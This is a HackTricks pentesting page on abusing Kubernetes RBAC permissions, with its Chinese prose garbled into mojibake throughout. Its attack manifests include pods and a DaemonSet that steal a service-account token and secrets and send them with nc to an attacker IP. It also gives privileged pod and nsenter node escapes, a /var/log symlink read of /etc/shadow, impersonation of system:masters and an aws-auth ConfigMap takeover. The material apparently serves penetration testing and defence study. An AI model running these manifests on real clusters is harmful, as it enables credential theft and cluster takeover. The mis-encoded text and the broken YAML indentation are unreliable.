# åœ¨Kubernetesä¸­æ»¥ç”¨è§’è‰²/é›†ç¾¤è§’è‰²

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æ½œåœ¨å±é™©çš„è§’è‰²å’Œé›†ç¾¤è§’è‰²é…ç½®ã€‚\
è¯·è®°ä½ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`kubectl api-resources`è·å–æ‰€æœ‰æ”¯æŒçš„èµ„æºã€‚

## **ç‰¹æƒæå‡**

ç‰¹æƒæå‡æ˜¯æŒ‡åœ¨é›†ç¾¤ä¸­ä»¥**ä¸åŒçš„æƒé™**ï¼ˆåœ¨Kubernetesé›†ç¾¤å†…æˆ–å¤–éƒ¨äº‘ä¸­ï¼‰è·å–**å¯¹ä¸åŒä¸»ä½“çš„è®¿é—®**ï¼Œä¸æ‚¨å·²ç»æ‹¥æœ‰çš„æƒé™ä¸åŒã€‚åœ¨Kubernetesä¸­ï¼ŒåŸºæœ¬ä¸Šæœ‰**4ç§ä¸»è¦æŠ€æœ¯æ¥æå‡ç‰¹æƒ**ï¼š

* èƒ½å¤Ÿ**å†’å……**åœ¨Kubernetesé›†ç¾¤å†…æˆ–å¤–éƒ¨äº‘ä¸­å…·æœ‰æ›´å¥½æƒé™çš„å…¶ä»–ç”¨æˆ·/ç»„/æœåŠ¡è´¦æˆ·
* èƒ½å¤Ÿ**åˆ›å»º/ä¿®è¡¥/æ‰§è¡Œpods**ï¼Œåœ¨å…¶ä¸­æ‚¨å¯ä»¥**æ‰¾åˆ°æˆ–é™„åŠ å…·æœ‰æ›´å¥½æƒé™çš„æœåŠ¡è´¦æˆ·**
* èƒ½å¤Ÿ**è¯»å–ç§˜å¯†**ï¼Œå› ä¸ºæœåŠ¡è´¦æˆ·çš„ä»¤ç‰Œå­˜å‚¨ä¸ºç§˜å¯†
* èƒ½å¤Ÿ**ä»å®¹å™¨é€ƒé€¸åˆ°èŠ‚ç‚¹**ï¼Œåœ¨æ­¤æ‚¨å¯ä»¥çªƒå–åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„å®¹å™¨çš„æ‰€æœ‰ç§˜å¯†ã€èŠ‚ç‚¹çš„å‡­æ®ä»¥åŠèŠ‚ç‚¹åœ¨å…¶è¿è¡Œçš„äº‘ä¸­çš„æƒé™ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰
* ç¬¬äº”ç§å€¼å¾—ä¸€æçš„æŠ€æœ¯æ˜¯èƒ½å¤Ÿåœ¨podä¸­**è¿è¡Œç«¯å£è½¬å‘**ï¼Œå› ä¸ºæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®è¯¥podå†…çš„æœ‰è¶£èµ„æºã€‚

### è®¿é—®ä»»ä½•èµ„æºæˆ–åŠ¨è¯ï¼ˆé€šé…ç¬¦ï¼‰

**é€šé…ç¬¦ï¼ˆ*ï¼‰å¯¹ä»»ä½•èµ„æºå’Œä»»ä½•åŠ¨è¯æˆäºˆæƒé™**ã€‚å®ƒç”±ç®¡ç†å‘˜ä½¿ç”¨ã€‚åœ¨ClusterRoleä¸­ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ»¥ç”¨é›†ç¾¤ä¸­çš„ä»»ä½•å‘½åç©ºé—´ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### ä½¿ç”¨ç‰¹å®šåŠ¨è¯è®¿é—®ä»»ä½•èµ„æº

åœ¨RBACä¸­ï¼ŒæŸäº›æƒé™å¸¦æ¥äº†é‡å¤§é£é™©ï¼š

1. **`create`:** æˆäºˆåˆ›å»ºä»»ä½•é›†ç¾¤èµ„æºçš„èƒ½åŠ›ï¼Œå­˜åœ¨ç‰¹æƒå‡çº§çš„é£é™©ã€‚
2. **`list`:** å…è®¸åˆ—å‡ºæ‰€æœ‰èµ„æºï¼Œå¯èƒ½æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚
3. **`get`:** å…è®¸è®¿é—®æœåŠ¡è´¦æˆ·çš„ç§˜å¯†ï¼Œæ„æˆå®‰å…¨å¨èƒã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

ä¸€ä¸ªå…·æœ‰åˆ›å»º pod æƒé™çš„æ”»å‡»è€…ï¼Œå¯ä»¥å°†ä¸€ä¸ªç‰¹æƒæœåŠ¡è´¦æˆ·é™„åŠ åˆ° pod ä¸­ï¼Œå¹¶çªƒå–è¯¥æœåŠ¡è´¦æˆ·çš„ä»¤ç‰Œä»¥å†’å……è¯¥æœåŠ¡è´¦æˆ·ã€‚æœ‰æ•ˆåœ°æå‡äº†å…¶æƒé™ã€‚

ä¸€ä¸ªå°†çªƒå– `bootstrap-signer` æœåŠ¡è´¦æˆ·ä»¤ç‰Œå¹¶å°†å…¶å‘é€ç»™æ”»å‡»è€…çš„ pod ç¤ºä¾‹ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod åˆ›å»ºä¸é€ƒé€¸

ä»¥ä¸‹æŒ‡ç¤ºå®¹å™¨å¯ä»¥æ‹¥æœ‰çš„æ‰€æœ‰æƒé™ï¼š

* **ç‰¹æƒè®¿é—®**ï¼ˆç¦ç”¨ä¿æŠ¤å’Œè®¾ç½®èƒ½åŠ›ï¼‰
* **ç¦ç”¨ namespaces hostIPC å’Œ hostPid**ï¼Œè¿™å¯ä»¥å¸®åŠ©æå‡æƒé™
* **ç¦ç”¨ hostNetwork** å‘½åç©ºé—´ï¼Œå…è®¸è®¿é—®ä»¥çªƒå–èŠ‚ç‚¹çš„äº‘æƒé™å’Œæ›´å¥½åœ°è®¿é—®ç½‘ç»œ
* **åœ¨å®¹å™¨å†…æŒ‚è½½ä¸»æœº /** 

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

åˆ›å»º podï¼š
```bash
kubectl --token $token create -f mount_root.yaml
```
æ¥è‡ª[è¿™æ¡æ¨æ–‡](https://twitter.com/mauilion/status/1129468485480751104)çš„å•è¡Œä»£ç ï¼Œå¹¶é™„åŠ äº†ä¸€äº›å†…å®¹ï¼š
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ç°åœ¨æ‚¨å¯ä»¥é€ƒåˆ°èŠ‚ç‚¹ï¼Œæ£€æŸ¥åæœŸåˆ©ç”¨æŠ€æœ¯ï¼š

#### éšè”½æ€§

æ‚¨å¯èƒ½å¸Œæœ›æ›´åŠ **éšè”½**ï¼Œåœ¨æ¥ä¸‹æ¥çš„é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¦‚æœæ‚¨åˆ›å»ºä¸€ä¸ªä»…å¯ç”¨å‰é¢æ¨¡æ¿ä¸­æåˆ°çš„ä¸€äº›æƒé™çš„ podï¼Œæ‚¨å°†èƒ½å¤Ÿè®¿é—®çš„å†…å®¹ï¼š

* **ç‰¹æƒ + hostPID**
* **ä»…ç‰¹æƒ**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_æ‚¨å¯ä»¥åœ¨_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _æ‰¾åˆ°å¦‚ä½•åˆ›å»º/æ»¥ç”¨å‰é¢ç‰¹æƒ pod é…ç½®çš„ç¤ºä¾‹_

### Pod åˆ›å»º - ç§»åŠ¨åˆ°äº‘

å¦‚æœæ‚¨å¯ä»¥**åˆ›å»º**ä¸€ä¸ª**pod**ï¼ˆå¯é€‰åœ°åˆ›å»ºä¸€ä¸ª**æœåŠ¡è´¦æˆ·**ï¼‰ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å°†äº‘è§’è‰²åˆ†é…ç»™ pod æˆ–æœåŠ¡è´¦æˆ·**æ¥**è·å¾—äº‘ç¯å¢ƒä¸­çš„æƒé™**ï¼Œç„¶åè®¿é—®å®ƒã€‚\
æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª**å…·æœ‰ä¸»æœºç½‘ç»œå‘½åç©ºé—´çš„ pod**ï¼Œæ‚¨å¯ä»¥**çªƒå–èŠ‚ç‚¹**å®ä¾‹çš„ IAM è§’è‰²ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **åˆ›å»º/è¡¥ä¸éƒ¨ç½²ã€å®ˆæŠ¤è¿›ç¨‹é›†ã€æœ‰çŠ¶æ€é›†ã€å¤åˆ¶æ§åˆ¶å™¨ã€å‰¯æœ¬é›†ã€ä½œä¸šå’Œå®šæ—¶ä½œä¸š**

å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥**åˆ›å»ºä¸€ä¸ªæ–° pod**å¹¶åƒå‰é¢çš„ç¤ºä¾‹ä¸€æ ·å»ºç«‹æƒé™ã€‚

ä»¥ä¸‹ yaml **åˆ›å»ºä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹é›†å¹¶æå– pod å†…éƒ¨ SA çš„ä»¤ç‰Œ**ï¼š
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** æ˜¯ Kubernetes ä¸­çš„ä¸€ä¸ªèµ„æºï¼Œç”¨äº **åœ¨ pod å†…éƒ¨çš„ shell ä¸­è¿è¡Œå‘½ä»¤**ã€‚è¿™å…è®¸ **åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œå‘½ä»¤æˆ–è·å– shell**ã€‚

å› æ­¤ï¼Œå¯ä»¥ **è¿›å…¥ pod å¹¶çªƒå– SA çš„ä»¤ç‰Œ**ï¼Œæˆ–è€…è¿›å…¥ç‰¹æƒ podï¼Œé€ƒé€¸åˆ°èŠ‚ç‚¹ï¼Œå¹¶çªƒå–èŠ‚ç‚¹ä¸­æ‰€æœ‰ pod çš„ä»¤ç‰Œå¹¶ (æ»¥ç”¨) èŠ‚ç‚¹ï¼š
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

æ­¤æƒé™å…è®¸**å°†ä¸€ä¸ªæœ¬åœ°ç«¯å£è½¬å‘åˆ°æŒ‡å®š pod ä¸­çš„ä¸€ä¸ªç«¯å£**ã€‚è¿™æ—¨åœ¨èƒ½å¤Ÿè½»æ¾è°ƒè¯•è¿è¡Œåœ¨ pod å†…çš„åº”ç”¨ç¨‹åºï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨å®ƒè®¿é—® pod å†…æœ‰è¶£ï¼ˆå¦‚æ•°æ®åº“ï¼‰æˆ–è„†å¼±çš„åº”ç”¨ç¨‹åºï¼ˆç½‘é¡µï¼Ÿï¼‰ï¼š
```
kubectl port-forward pod/mypod 5000:5000
```
### ä¸»æœºå¯å†™ /var/log/ é€ƒé€¸

æ­£å¦‚[**æœ¬ç ”ç©¶ä¸­æ‰€æŒ‡å‡ºçš„**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æˆ–åˆ›å»ºä¸€ä¸ª**æŒ‚è½½äº†ä¸»æœº `/var/log/` ç›®å½•**çš„ podï¼Œæ‚¨å¯ä»¥**é€ƒé€¸å‡ºå®¹å™¨**ã€‚\
è¿™åŸºæœ¬ä¸Šæ˜¯å› ä¸ºå½“**Kube-API å°è¯•è·å–**å®¹å™¨çš„æ—¥å¿—ï¼ˆä½¿ç”¨ `kubectl logs <pod>`ï¼‰æ—¶ï¼Œå®ƒ**è¯·æ±‚ pod çš„ `0.log`** æ–‡ä»¶ï¼Œä½¿ç”¨çš„æ˜¯ **Kubelet** æœåŠ¡çš„ `/logs/` ç«¯ç‚¹ã€‚\
Kubelet æœåŠ¡æš´éœ²äº† `/logs/` ç«¯ç‚¹ï¼Œè¿™åŸºæœ¬ä¸Šæ˜¯**æš´éœ²äº†å®¹å™¨çš„ `/var/log` æ–‡ä»¶ç³»ç»Ÿ**ã€‚

å› æ­¤ï¼Œå…·æœ‰**å†™å…¥å®¹å™¨ /var/log/ æ–‡ä»¶å¤¹**æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼š

* ä¿®æ”¹å…¶å®¹å™¨çš„ `0.log` æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº `/var/logs/pods/namespace_pod_uid/container/0.log`ï¼‰ï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ª**æŒ‡å‘ `/etc/shadow`** çš„ç¬¦å·é“¾æ¥ã€‚ä¾‹å¦‚ã€‚ç„¶åï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡ä»¥ä¸‹æ–¹å¼æå–ä¸»æœºçš„ shadow æ–‡ä»¶ï¼š
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* å¦‚æœæ”»å‡»è€…æ§åˆ¶ä»»ä½•å…·æœ‰ **è¯»å– `nodes/log` æƒé™** çš„ä¸»ä½“ï¼Œä»–å¯ä»¥åœ¨ `/host-mounted/var/log/sym` ä¸­åˆ›å»ºä¸€ä¸ª **ç¬¦å·é“¾æ¥** æŒ‡å‘ `/`ï¼Œå½“ **è®¿é—® `https://<gateway>:10250/logs/sym/` æ—¶ï¼Œä»–å°†åˆ—å‡ºä¸»æœºçš„æ ¹** æ–‡ä»¶ç³»ç»Ÿï¼ˆæ›´æ”¹ç¬¦å·é“¾æ¥å¯ä»¥æä¾›å¯¹æ–‡ä»¶çš„è®¿é—®ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å®éªŒå®¤å’Œè‡ªåŠ¨åŒ–åˆ©ç”¨å¯ä»¥åœ¨** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### ç»•è¿‡ readOnly ä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”é«˜åº¦ç‰¹æƒçš„èƒ½åŠ› `CAP_SYS_ADMIN` å¯ç”¨ï¼Œä½ å¯ä»¥ç›´æ¥å°†æ–‡ä»¶å¤¹é‡æ–°æŒ‚è½½ä¸º rwï¼š
```bash
mount -o rw,remount /hostlogs/
```
#### ç»•è¿‡ hostPath readOnly ä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

æ­£å¦‚åœ¨ [**è¿™é¡¹ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) ä¸­æ‰€è¿°ï¼Œå¯ä»¥ç»•è¿‡ä¿æŠ¤ï¼š
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
è¿™æ—¨åœ¨é€šè¿‡ä½¿ç”¨ PersistentVolume å’Œ PersistentVolumeClaim æ¥æŒ‚è½½å…·æœ‰å¯å†™è®¿é—®æƒé™çš„ä¸»æœºæ–‡ä»¶å¤¹åˆ°å®¹å™¨ä¸­ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ hostPath æŒ‚è½½ï¼Œä»è€Œé˜²æ­¢åƒä¹‹å‰é‚£æ ·çš„é€ƒé€¸ï¼š
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **å†’å……ç‰¹æƒè´¦æˆ·**

é€šè¿‡ [**ç”¨æˆ·å†’å……**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å†’å……ç‰¹æƒè´¦æˆ·ã€‚

åªéœ€åœ¨ `kubectl` å‘½ä»¤ä¸­ä½¿ç”¨å‚æ•° `--as=<username>` æ¥å†’å……ç”¨æˆ·ï¼Œæˆ–ä½¿ç”¨ `--as-group=<group>` æ¥å†’å……ç»„ï¼š
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
æˆ–ä½¿ç”¨ REST APIï¼š
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### åˆ—å‡ºç§˜å¯†

**åˆ—å‡ºç§˜å¯†çš„æƒé™å¯èƒ½å…è®¸æ”»å‡»è€…å®é™…è¯»å–ç§˜å¯†** è®¿é—® REST API ç«¯ç‚¹ï¼š
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### è¯»å–ç§˜å¯† â€“ æš´åŠ›ç ´è§£ä»¤ç‰Œ ID

è™½ç„¶æŒæœ‰å…·æœ‰è¯»å–æƒé™çš„ä»¤ç‰Œçš„æ”»å‡»è€…éœ€è¦ç¡®åˆ‡çš„ç§˜å¯†åç§°æ‰èƒ½ä½¿ç”¨å®ƒï¼Œä½†ä¸æ›´å¹¿æ³›çš„ _**åˆ—å‡ºç§˜å¯†**_ æƒé™ä¸åŒï¼Œä»ç„¶å­˜åœ¨æ¼æ´ã€‚ç³»ç»Ÿä¸­çš„é»˜è®¤æœåŠ¡å¸æˆ·å¯ä»¥è¢«æšä¸¾ï¼Œæ¯ä¸ªå¸æˆ·éƒ½ä¸ä¸€ä¸ªç§˜å¯†ç›¸å…³è”ã€‚è¿™äº›ç§˜å¯†çš„åç§°ç»“æ„ä¸ºï¼šä¸€ä¸ªé™æ€å‰ç¼€åè·Ÿä¸€ä¸ªéšæœºçš„äº”å­—ç¬¦å­—æ¯æ•°å­—ä»¤ç‰Œï¼ˆæ’é™¤æŸäº›å­—ç¬¦ï¼‰ï¼Œæ ¹æ® [æºä»£ç ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ã€‚

è¯¥ä»¤ç‰Œæ˜¯ä»ä¸€ä¸ªæœ‰é™çš„ 27 å­—ç¬¦é›†ï¼ˆ`bcdfghjklmnpqrstvwxz2456789`ï¼‰ç”Ÿæˆçš„ï¼Œè€Œä¸æ˜¯å®Œæ•´çš„å­—æ¯æ•°å­—èŒƒå›´ã€‚è¿™ä¸ªé™åˆ¶å°†æ€»çš„å¯èƒ½ç»„åˆå‡å°‘åˆ° 14,348,907ï¼ˆ27^5ï¼‰ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å‡ ä¸ªå°æ—¶å†…å¯è¡Œåœ°æ‰§è¡Œæš´åŠ›æ”»å‡»ä»¥æ¨æ–­ä»¤ç‰Œï¼Œè¿™å¯èƒ½å¯¼è‡´é€šè¿‡è®¿é—®æ•æ„ŸæœåŠ¡å¸æˆ·è¿›è¡Œæƒé™æå‡ã€‚

### è¯ä¹¦ç­¾åè¯·æ±‚

å¦‚æœæ‚¨åœ¨èµ„æº `certificatesigningrequests` ä¸­å…·æœ‰åŠ¨è¯ **`create`**ï¼ˆæˆ–è‡³å°‘åœ¨ `certificatesigningrequests/nodeClient` ä¸­ï¼‰ã€‚æ‚¨å¯ä»¥ **åˆ›å»º** ä¸€ä¸ª **æ–°èŠ‚ç‚¹** çš„æ–° CeSRã€‚

æ ¹æ® [æ–‡æ¡£ï¼Œè‡ªåŠ¨æ‰¹å‡†æ­¤è¯·æ±‚æ˜¯å¯èƒ½çš„](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹æ‚¨ **ä¸éœ€è¦é¢å¤–çš„æƒé™**ã€‚å¦‚æœæ²¡æœ‰ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿæ‰¹å‡†è¯·æ±‚ï¼Œè¿™æ„å‘³ç€åœ¨ `certificatesigningrequests/approval` ä¸­è¿›è¡Œæ›´æ–°ï¼Œå¹¶åœ¨ `signers` ä¸­è¿›è¡Œ `approve`ï¼Œèµ„æºåç§°ä¸º `<signerNameDomain>/<signerNamePath>` æˆ– `<signerNameDomain>/*`ã€‚

ä¸€ä¸ª **å…·æœ‰æ‰€æœ‰æ‰€éœ€æƒé™çš„è§’è‰²ç¤ºä¾‹** æ˜¯ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
æ‰€ä»¥ï¼Œéšç€æ–°çš„èŠ‚ç‚¹CSRè¢«æ‰¹å‡†ï¼Œä½ å¯ä»¥**æ»¥ç”¨**èŠ‚ç‚¹çš„ç‰¹æ®Šæƒé™æ¥**çªƒå–ç§˜å¯†**å’Œ**æå‡æƒé™**ã€‚

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://www.4armed.com/blog/hacking-kubelet-on-gke/)å’Œ[**è¿™ç¯‡æ–‡ç« **](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ä¸­ï¼ŒGKE K8s TLSå¼•å¯¼é…ç½®è¢«è®¾ç½®ä¸º**è‡ªåŠ¨ç­¾å**ï¼Œå¹¶è¢«æ»¥ç”¨æ¥ç”Ÿæˆæ–°çš„K8sèŠ‚ç‚¹çš„å‡­è¯ï¼Œç„¶ååˆ©ç”¨è¿™äº›å‡­è¯æå‡æƒé™ï¼Œçªƒå–ç§˜å¯†ã€‚\
å¦‚æœä½ **æ‹¥æœ‰æåˆ°çš„æƒé™ï¼Œä½ å¯ä»¥åšåŒæ ·çš„äº‹æƒ…**ã€‚è¯·æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªç¤ºä¾‹ç»•è¿‡äº†é˜²æ­¢æ–°èŠ‚ç‚¹è®¿é—®å®¹å™¨å†…éƒ¨ç§˜å¯†çš„é”™è¯¯ï¼Œå› ä¸º**èŠ‚ç‚¹åªèƒ½è®¿é—®æŒ‚è½½åœ¨å…¶ä¸Šçš„å®¹å™¨çš„ç§˜å¯†ã€‚**

ç»•è¿‡è¿™ä¸ªé™åˆ¶çš„æ–¹æ³•å°±æ˜¯**ä¸ºæŒ‚è½½æœ‰æœ‰è¶£ç§˜å¯†çš„å®¹å™¨çš„èŠ‚ç‚¹åç§°åˆ›å»ºèŠ‚ç‚¹å‡­è¯**ï¼ˆä½†åªéœ€æŸ¥çœ‹å¦‚ä½•åœ¨ç¬¬ä¸€ç¯‡æ–‡ç« ä¸­åšåˆ°è¿™ä¸€ç‚¹ï¼‰ï¼š
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth é…ç½®æ˜ å°„

å¯ä»¥åœ¨ EKSï¼ˆéœ€è¦åœ¨ AWS ä¸Šï¼‰é›†ç¾¤çš„ kube-system å‘½åç©ºé—´ä¸­ä¿®æ”¹ **`configmaps`** çš„ä¸»ä½“å¯ä»¥é€šè¿‡è¦†ç›– **aws-auth** é…ç½®æ˜ å°„æ¥è·å¾—é›†ç¾¤ç®¡ç†å‘˜æƒé™ã€‚\
æ‰€éœ€çš„åŠ¨è¯æ˜¯ **`update`** å’Œ **`patch`**ï¼Œæˆ–è€…å¦‚æœé…ç½®æ˜ å°„å°šæœªåˆ›å»ºï¼Œåˆ™ä¸º **`create`**ï¼š

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
